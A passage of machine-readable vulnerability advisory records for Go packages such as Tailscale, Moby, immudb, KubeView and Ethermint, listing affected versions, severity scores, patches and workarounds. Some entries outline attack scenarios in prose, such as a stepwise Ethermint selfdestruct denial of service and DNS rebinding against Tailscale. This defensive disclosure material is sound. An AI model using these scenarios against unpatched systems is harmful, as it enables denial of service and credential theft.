"https://github.com/pingcap/tidb/commit/d0376379d615cc8f263a0b17c031ce403c8dcbfb"}, {"type": "WEB", "url": "https://advisory.dw1.io/45"}, {"type": "PACKAGE", "url": "https://github.com/pingcap/tidb"}, {"type": "WEB", "url": "https://huntr.dev/bounties/120f1346-e958-49d0-b66c-0f889a469540"}], "database_specific": {"cwe_ids": ["CWE-134"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-11-04T20:48:44Z", "nvd_published_at": "2022-11-04T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-prjq-f4q3-fvfr", "modified": "2023-08-30T00:09:03Z", "published": "2022-11-15T19:05:07Z", "aliases": ["CVE-2020-7731"], "summary": "github.com/russellhaering/gosaml2 is vulnerable to NULL Pointer Dereference", "details": "### Impact\nIn versions prior to v0.7.0 it was possible for an attacker to supply an invalid assertion which would trigger a panic due to a nil-pointer dereference.\n\n### Patches\nThe issue was patched in v0.7.0, released on March 2, 2022.\n\n### Workarounds\nCallers to `gosaml2` can use `recover()` to handle panics to mitigate a potential DoS.\n\n### References\nSee issue [#59](https://github.com/russellhaering/gosaml2/issues/59) for details.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/russellhaering/gosaml2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/russellhaering/goxmldsig"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/security/advisories/GHSA-prjq-f4q3-fvfr"}, {"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/issues/59"}, {"type": "WEB", "url": "https://github.com/russellhaering/goxmldsig/issues/48"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-gq5r-cc4w-g8xf"}, {"type": "PACKAGE", "url": "https://github.com/russellhaering/gosaml2"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRUSSELLHAERINGGOSAML2-608302"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-11-15T19:05:07Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-22vc-5pgw-644q", "modified": "2022-12-02T22:27:39Z", "published": "2022-11-27T03:30:25Z", "aliases": ["CVE-2022-45933"], "summary": "KubeView vulnerable to full cluster takeover due to improper authentication", "details": "KubeView through 0.1.31 allows attackers to obtain control of a Kubernetes cluster because api/scrape/kube-system does not require authentication, and retrieves certificate files that can be used for authentication as kube-admin. NOTE: the vendor's position is that KubeView was a \"fun side project and a learning exercise,\" and not \"very secure.\"", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/benc-uk/kubeview"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.1.31"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-45933"}, {"type": "WEB", "url": "https://github.com/benc-uk/kubeview/issues/95"}, {"type": "PACKAGE", "url": "https://github.com/benc-uk/kubeview"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-306"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-02T22:27:39Z", "nvd_published_at": "2022-11-27T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9fmc-5fq4-5jwh", "modified": "2022-11-10T23:51:03Z", "published": "2022-11-10T12:01:03Z", "aliases": ["CVE-2022-3867"], "summary": "HashiCorp Nomad vulnerable to Insufficient Session Expiration", "details": "HashiCorp Nomad and Nomad Enterprise 1.4.0 up to 1.4.1 event stream subscribers using a token with TTL receive updates until token garbage is collected. Fixed in 1.4.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3867"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/commit/dd6a4634a9652197fe4182e830f9a737d0ae1216"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-26-nomad-s-event-stream-subscriber-using-acl-token-with-ttl-receive-updates-until-garbage-collected/46168"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": ["CWE-613"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-11-10T23:51:03Z", "nvd_published_at": "2022-11-10T06:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-672p-m5jq-mrh8", "modified": "2022-11-28T16:03:40Z", "published": "2022-11-21T20:38:39Z", "aliases": ["CVE-2022-36111"], "summary": "Insufficient Verification of Proofs generated by the immudb server in client SDK.", "details": "### Impact\n\nIn certain scenario a malicious immudb server can provide a falsified proof that will be accepted by the client SDK signing a falsified transaction replacing the genuine one. This situation can not be triggered by a genuine immudb server and requires the client to perform a specific list of verified operations resulting in acceptance of an invalid state value.\n\nThis vulnerability only affects immudb client SDKs, the immudb server itself is not affected by this vulnerability.\n\n### Detailed description\n\nimmudb uses Merkle Tree enhanced with additional linear part to perform consistency proofs between two transactions. The linear part is built from the last leaf node of the Merkle Tree compensating for transactions that were not yet consumed by the Merkle Tree calculation.\n\nThe Merkle Tree part is then used to perform proofs for things that are in transaction range covered by the Merkle Tree where the linear part is used to check those that are not yet in the Merkle Tree.\n\nWhen doing consistency checks between two immudb states, the linear proof part is not fully checked. In fact only the first (last Merkle Tree leaf) and the last (current DB state value) are checked against new Merkle Tree without ensuring that elements in the middle of that chain are correctly added as Merkle Tree leafs.\n\nThis lack of check means that the database can present different set of hashes on the linear proof part to what would later be used once those become part of the Merkle Tree. This property can be exploited by the database to expose two different transaction entries depending on the other transaction that the user requested consistency proof for.\n\nIn practice this could lead to a following scenario:\n\n* a client requests a verified write operation\n* the server responds with a proof for the transaction\n* client stores the state value retrieved from the server and expects it to be a confirmation of that write and all the history of the database before that transaction\n* a series of validated read / write operations is performed by the client, each accompanied by a successfully validated consistency proof and update of the client state\n* the client requests verified get operation on the transaction it has written before (and that was verified with a proof from the server)\n* the server replies with a completely different transaction that can be properly validated according to the currently stored db state on the client side\n\n### Patches\n\nThe following Go SDK versions is not vulnerable:\n\n| **SDK** | **Version** |\n|-------|------------|\n| [go](pkg.go.dev/github.com/codenotary/immudb/pkg/client) | 1.4.1 |\n\n### Workarounds\n\nInvalid proofs can not be generated in a normal immudb server and will be detected by a genuine replica server.\nTo ensure that the server does not produce invalid proofs and to check that the history presented by the server\ndoes not contain falsified transactions, one should run a genuine immudb replica server in a safe environment\nand fully synchronize all databases with the primary.\n\n### References\n\n* https://github.com/codenotary/immudb/tree/master/docs/security/vulnerabilities/linear-fake\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open a discussion in [immudb Discussions](https://github.com/codenotary/immudb/discussions/new)\n* Email us at [immudb-security@codenotary.com](mailto:immudb-security@codenotary.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/codenotary/immudb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/codenotary/immudb/security/advisories/GHSA-672p-m5jq-mrh8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36111"}, {"type": "WEB", "url": "https://github.com/codenotary/immudb/commit/7267d67e28be8f0257b71d734611a051593e8a81"}, {"type": "WEB", "url": "https://github.com/codenotary/immudb/commit/acf7f1b3d62436ea5e038acea1fc6394f90ab1c6"}, {"type": "PACKAGE", "url": "https://github.com/codenotary/immudb"}, {"type": "WEB", "url": "https://github.com/codenotary/immudb/releases/tag/v1.4.1"}, {"type": "WEB", "url": "https://github.com/codenotary/immudb/tree/master/docs/security/vulnerabilities/linear-fake"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/codenotary/immudb/pkg/client"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1117"}], "database_specific": {"cwe_ids": ["CWE-345"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-11-21T20:38:39Z", "nvd_published_at": "2022-11-23T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-99g5-5643-xphp", "modified": "2022-11-15T19:57:01Z", "published": "2022-11-10T19:01:05Z", "aliases": ["CVE-2021-40289"], "summary": "mm-wiki is vulnerable to Cross-Site Scripting (XSS)", "details": "mm-wki v0.2.1 is vulnerable to Cross Site Scripting (XSS).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/phachon/mm-wiki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-40289"}, {"type": "WEB", "url": "https://github.com/phachon/mm-wiki/issues/319"}, {"type": "PACKAGE", "url": "https://github.com/phachon/mm-wiki"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-11-10T22:20:01Z", "nvd_published_at": "2022-11-10T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vp35-85q5-9f25", "modified": "2022-11-11T00:03:31Z", "published": "2022-11-11T00:03:31Z", "aliases": [], "summary": "Container build can leak any path on the host into the container", "details": "### Description\n\nMoby is the open source Linux container runtime and set of components used to build a variety of downstream container runtimes, including Docker CE, Mirantis Container Runtime (formerly Docker EE), and Docker Desktop. Moby allows for building container images using a set of build instructions (usually named and referred to as a \"Dockerfile\"), and a build context, which is not unlike the CWD in which the Dockerfile instructions are executed.\n\nContainers may be built using a variety of tools and build backends available in the Moby ecosystem; in all cases, builds may not include files outside of the build context (such as using absolute or relative-parent paths). This is enforced through both checks in the build backends, and the containerization of the build process itself.\n\nVersions of Git where CVE-2022-39253 is present and exploited by a malicious repository, when used in combination with Moby, are subject to an unexpected inclusion of arbitrary filesystem paths in the build context, without any visible warning to the user.\n\nThis issue was originally reported by Wenxiang Qian of Tencent Blade Team, and the root-cause analysis was performed by Cory Snider of Mirantis, with assistance from Bjorn Neergaard of the same. The issue was then reported to the Git project, and Taylor Blau led the process resolving the root issue in Git.\n\n### Impact\n\nThis vulnerability originates in Git, but can be used to violate assumptions that may have security implications for users of Moby and related components. Users may rely on the fact that a build context ensures that outside files cannot be referenced or incorporated using multiple enforcement mechanisms, or expect a warning if this does not hold true. A maliciously crafted Git repository exploiting CVE-2022-39253 can violate this assumption, and potentially include sensitive files that are subsequently uploaded to a container image repository, or disclosed by code inside the resulting container image.\n\nAs this issue cannot be triggered remotely, except by users who already have full control over the daemon through the API, and it requires exploiting a vulnerability in Git by convincing a user to build a maliciously crafted repository, the impact in Moby is considered low.\n\n### Patches\n\nMoby 20.10.20, and Mirantis Container Runtime (formerly Docker Enterprise Edition) 20.10.14 will contain mitigations for CVE-2022-39253 when a Git clone is performed by Moby components (on either the daemon or API client side). However, as these mitigations only apply to certain scenarios (build of `git+<protocol>://...` URL contexts) and cannot protect against a malicious repository already on disk, users should update to a version of Git containing patches for CVE-2022-39253 on all their systems running both API clients and daemons.\n\nSpecifically, patches in Moby (including patches incorporated from BuildKit) protect against the following:\n\n* `docker build` with the legacy builder (e.g. `DOCKER_BUILDKIT` unset or set to 0) of a Git URL context. Note that depending on available API versions and the CLI version, the Git clone operation can take place on either the client or the daemon side. Both must be updated (or have Git updated) to fully protect this build method.\n* `docker build` with the BuildKit builder (e.g. `DOCKER_BUILDKIT=1`) of a Git URL context.\n* `docker buildx build` with `BUILDKIT_CONTEXT_KEEP_GIT_DIR=1` of a Git URL context.\n\nPatches in BuildKit incorporated into Docker Compose protect against CVE-2022-39253 during Compose-driven builds of Git URL contexts.\n\nPatches in Moby and related projects such as BuildKit, the Docker CLI, and Docker Compose **cannot** fully protect against CVE-2022-39253, as it may be triggered by a malicious repository already on disk that a unpatched Git client has interacted with (specifically, commands that check out submodules such as `git clone --recursive`, `git submodule update`, etc.  may have already triggered the Git vulnerability).\n\n### Workarounds\n\nWhile this behavior is unexpected and undesirable, and has resulted in this security advisory, users should keep in mind that building a container entails arbitrary code execution. Users should not build a repository/build context they do not trust, as containerization cannot protect against all possible attacks.\n\nWhen building with BuildKit (e.g. `docker buildx build` or `docker build` with `DOCKER_BUILDKIT=1`), this issue cannot be exploited unless `--build-arg BUILDKIT_CONTEXT_KEEP_GIT_DIR=1` was also passed, as by default BuildKit will discard the `.git` directory of a Git URL context immediately after cloning and checking out the repository.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* [Open an issue](https://github.com/moby/moby/issues/new)\n* Email us at [security@docker.com](mailto:security@docker.com)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/moby/moby"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "20.10.20"}]}], "database_specific": {"last_known_affected_version_range": "<= 20.10.19"}}], "references": [{"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-vp35-85q5-9f25"}, {"type": "WEB", "url": "https://github.blog/2022-10-17-git-security-vulnerabilities-announced/"}, {"type": "PACKAGE", "url": "https://github.com/moby/moby"}, {"type": "WEB", "url": "https://github.com/moby/moby/releases/tag/v20.10.20"}, {"type": "WEB", "url": "https://lore.kernel.org/git/xmqq4jw1uku5.fsf@gitster.g/T/#u"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-11-11T00:03:31Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-pp3f-xrw5-q5j4", "modified": "2023-08-29T19:39:52Z", "published": "2022-11-21T22:31:31Z", "aliases": ["CVE-2022-41920"], "summary": "Lancet vulnerable to path traversal when unzipping files", "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nZipSlip issue when use fileutil package to unzip files.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nIt will fixed in v2.1.10, Please upgrade version to v2.1.10 or above.\nUsers who use v1.x.x should upgrade v1.3.4 or above.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nNo, users have to upgrade version.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/duke-git/lancet/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.1.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/duke-git/lancet"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/duke-git/lancet/security/advisories/GHSA-pp3f-xrw5-q5j4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41920"}, {"type": "WEB", "url": "https://github.com/duke-git/lancet/issues/62"}, {"type": "WEB", "url": "https://github.com/duke-git/lancet/commit/f133b32faa05eb93e66175d01827afa4b7094572"}, {"type": "WEB", "url": "https://github.com/duke-git/lancet/commit/f869a0a67098e92d24ddd913e188b32404fa72c9"}, {"type": "PACKAGE", "url": "https://github.com/duke-git/lancet"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1114"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-11-21T22:31:31Z", "nvd_published_at": "2022-11-17T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2chg-86hq-7w38", "modified": "2023-10-02T11:07:25Z", "published": "2022-11-07T12:00:34Z", "aliases": ["CVE-2022-44797"], "summary": "btcd mishandles witness size checking", "details": "btcd before 0.23.2, as used in Lightning Labs lnd before 0.15.2-beta and other Bitcoin-related products, mishandles witness size checking.\n\n### Specific Go Packages Affected\ngithub.com/btcsuite/btcd/wire", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/btcsuite/btcd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.23.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/lightningnetwork/lnd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.15.2-beta"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-44797"}, {"type": "WEB", "url": "https://github.com/lightningnetwork/lnd/issues/7002"}, {"type": "WEB", "url": "https://github.com/btcsuite/btcd/pull/1896"}, {"type": "WEB", "url": "https://github.com/btcsuite/btcd/pull/1896/commits/f523d4ccaa5f34a2f761f16a05f5d6e6665b1168"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-2chg-86hq-7w38"}, {"type": "PACKAGE", "url": "https://github.com/btcsuite/btcd"}, {"type": "WEB", "url": "https://github.com/btcsuite/btcd/releases/tag/v0.23.2"}, {"type": "WEB", "url": "https://github.com/lightningnetwork/lnd/releases/tag/v0.15.2-beta"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1098"}], "database_specific": {"cwe_ids": [], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-11-07T16:15:55Z", "nvd_published_at": "2022-11-07T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qccm-wmcq-pwr6", "modified": "2022-12-01T22:12:32Z", "published": "2022-11-21T22:34:22Z", "aliases": ["CVE-2022-41925"], "summary": "Tailscale daemon is vulnerable to information disclosure via CSRF", "details": "A vulnerability identified in the Tailscale client allows a malicious website to access the peer API, which can then be used to access Tailscale environment variables.\n\n**Affected platforms:** All\n**Patched Tailscale client versions:** v1.32.3 or later, v1.33.257 or later (unstable)\n\n### What happened?\nIn the Tailscale client, the peer API was vulnerable to DNS rebinding. This allowed an attacker-controlled website visited by the node to rebind DNS for the peer API to an attacker-controlled DNS server, and then making peer API requests in the client, including accessing the node\u2019s Tailscale environment variables.\n\n### Who is affected?\nAll Tailscale clients prior to version v.1.32.3 are affected.\n\n### What should I do?\nUpgrade to v1.32.3 or later to remediate the issue.\n\n### What is the impact?\nAn attacker with access to the peer API on a node could use that access to read the node\u2019s environment variables, including any credentials or secrets stored in environment variables. This may include Tailscale authentication keys, which could then be used to add new nodes to the user\u2019s tailnet. The peer API access could also be used to learn of other nodes in the tailnet or send files via Taildrop.\n\nAn attacker with access to the peer API who sent a malicious file via Taildrop which was accessed while it was loading could use this to gain access to the local API, and remotely execute code.\n\nThere is no evidence of this vulnerability being purposefully triggered or exploited.\n\n### Credits\nWe would like to thank [Emily Trau](https://github.com/emilytrau) and [Jamie McClymont (CyberCX)](https://twitter.com/JJJollyjim) for reporting this issue. Further detail is available in [their blog post](https://emily.id.au/tailscale).\n\n### References\n* [TS-2022-005](https://tailscale.com/security-bulletins/#ts-2022-005)\n* [Researcher blog post](https://emily.id.au/tailscale)\n\n### For more information\nIf you have any questions or comments about this advisory, [contact Tailscale support](https://tailscale.com/contact/support/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:A/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "tailscale.com/cmd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.32.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/tailscale/tailscale/security/advisories/GHSA-qccm-wmcq-pwr6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41925"}, {"type": "WEB", "url": "https://emily.id.au/tailscale"}, {"type": "PACKAGE", "url": "https://github.com/tailscale/tailscale"}, {"type": "WEB", "url": "https://tailscale.com/security-bulletins/#ts-2022-005"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-352"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-11-21T22:34:22Z", "nvd_published_at": "2022-11-23T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m5xf-x7q6-3rm7", "modified": "2023-08-29T22:52:24Z", "published": "2022-11-18T17:14:39Z", "aliases": ["CVE-2022-39383"], "summary": "KubeVela VelaUX APIserver has SSRF vulnerability ", "details": "### Impact\nUsers using the VelaUX APIServer could be affected by this vulnerability.\n\nWhen using Helm Chart as the component delivery method, the request address of the warehouse is not restricted, and there is a blind SSRF vulnerability.\n\nThis issue is patched in 1.5.9 and 1.6.2.\n\n### References\nFix by: #5000 \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [KubeVela repo](https://github.com/kubevela/kubevela)\n* Email us at [here](https://github.com/kubevela/kubevela#contact-us)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/oam-dev/kubevela"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0-alpha.1"}, {"fixed": "1.6.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/oam-dev/kubevela"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubevela/kubevela/security/advisories/GHSA-m5xf-x7q6-3rm7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39383"}, {"type": "WEB", "url": "https://github.com/kubevela/kubevela/pull/5000"}, {"type": "PACKAGE", "url": "https://github.com/kubevela/kubevela"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1113"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-11-18T17:14:39Z", "nvd_published_at": "2022-11-16T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6cqj-6969-p57x", "modified": "2022-11-28T16:16:29Z", "published": "2022-11-21T20:38:51Z", "aliases": ["CVE-2022-39199"], "summary": "Lack of proper validation of server UUID can be used by the server to trick the client to accept invalid proofs", "details": "### Impact\n\nimmudb client SDKs use server's UUID to distinguish between different server instance so that the client can connect to different immudb instances and keep the state for multiple servers. SDK does not validate this uuid and can accept any value reported by the server. A malicious server can change the reported UUID tricking the client to treat it as a different server thus accepting a state completely irrelevant to the one previously retrieved from the server.\n\n### Patches\n\nThe following Go SDK versions are not vulnerable:\n\n| **SDK** | **Version** |\n|-------|------------|\n| [go](pkg.go.dev/github.com/codenotary/immudb/pkg/client) | 1.4.1 |\n\n### Workarounds\n\nWhen initializing an immudb client object, a custom state handler can be used to store the state. Providing custom implementation that ignores the server UUID can be used to ensure that even if the server changes the UUID, client will still consider it to be the same server.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open a discussion in [immudb Discussions](https://github.com/codenotary/immudb/discussions/new)\n* Email us at [immudb-security@codenotary.com](mailto:immudb-security@codenotary.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/codenotary/immudb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/codenotary/immudb/security/advisories/GHSA-6cqj-6969-p57x"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39199"}, {"type": "WEB", "url": "https://github.com/codenotary/immudb/commit/cade04756ff3f0a3b9e8d24149062744574adf5d"}, {"type": "PACKAGE", "url": "https://github.com/codenotary/immudb"}, {"type": "WEB", "url": "https://github.com/codenotary/immudb/releases/tag/v1.4.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1118"}], "database_specific": {"cwe_ids": ["CWE-345"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-11-21T20:38:51Z", "nvd_published_at": "2022-11-22T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f92v-grc2-w2fg", "modified": "2022-08-18T19:04:47Z", "published": "2022-08-18T19:04:47Z", "aliases": ["CVE-2022-35936"], "summary": "Ethermint vulnerable to DoS through unintended Contract Selfdestruct", "details": "# Vulnerability Report\n\n## Impact\n\nSmart contract applications that make use of the `selfdestruct` functionality and their end-users.\n\n## Classification\n\nThe vulnerability has been classified as `high` with a CVSS score of `8.2`. It has the potential to create a denial-of-service to all contracts that can invoke the [`selfdestruct`](https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347) function to destroy a smart contract. \n\n## Users Impacted\n\nDue to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.\n\n## Disclosure\n\nIn Ethermint running versions before `v0.17.2`, the contract `selfdestruct` invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the [`DeleteAccount`](https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203) function, all contracts that used the identical bytecode (i.e shared the same `CodeHash`) will also stop working once one contract invokes `selfdestruct`, even though the other contracts did not invoke the `selfdestruct` OPCODE.\n\n### Additional Details\n\nThe same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry `bytecode hash --> bytecode` which is shared by those contracts. Unfortunately, when one of the contracts invokes `selfdestruct`, it will remove the corresponding `bytecode hash -> bytecode` entry, and thus it disables all the contracts that share the same bytecode.\n\nThe attack scenario is as follows:\n\n1. The malicious attacker identifies a vulnerable contract that can invoke `selfdestruct`\n2. The attacker deploys a copy of the contract with identical bytecode\n3. Finally, the attacker triggers the `selfdestruct` operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).\n\n## Patches\n\n*Has the problem been patched? What versions should users upgrade to?*\n\nThis vulnerability has been patched in Ethermint versions \u2265[v0.18.0](https://github.com/evmos/ethermint/releases/tag/v0.18.0). The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.\n\n#### Details\n\nThe patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.\nAt the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on `selfdestruct` invocations. This behavior is the same with go-ethereum.\n\n## Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nIf a contract is subject to DoS due to this issue, the user can redeploy the same contract, _i.e_ with identical bytecode, so that the original contract's code is recovered.\n\nThe new contract deployment restores the `bytecode hash -> bytecode` entry in the internal state.\n\n## References\n\n*Are there any links users can visit to find out more?*\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the Core Team in [Discord](https://discord.gg/evmos)\n* Open a discussion in [evmos/ethermint](https://github.com/evmos/ethermint/discussions)\n* Email us at [security@evmos.org](mailto:security@evmos.org) for security questions\n* For Press, email us at [evmos@west-comms.com](mailto:evmos@west-comms.com).\n\n### Credits\n\nThanks to the \n\n- Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.\n- Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/evmos/ethermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.18.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.17.2"}}, {"package": {"ecosystem": "Go", "name": "github.com/evmos/evmos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.0.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 6.0.3"}}, {"package": {"ecosystem": "Go", "name": "github.com/crypto-org-chain/cronos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.1-rc2"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.7.0"}}, {"package": {"ecosystem": "Go", "name": "github.com/Kava-Labs/kava"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.18.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.17.5"}}], "references": [{"type": "WEB", "url": "https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg"}, {"type": 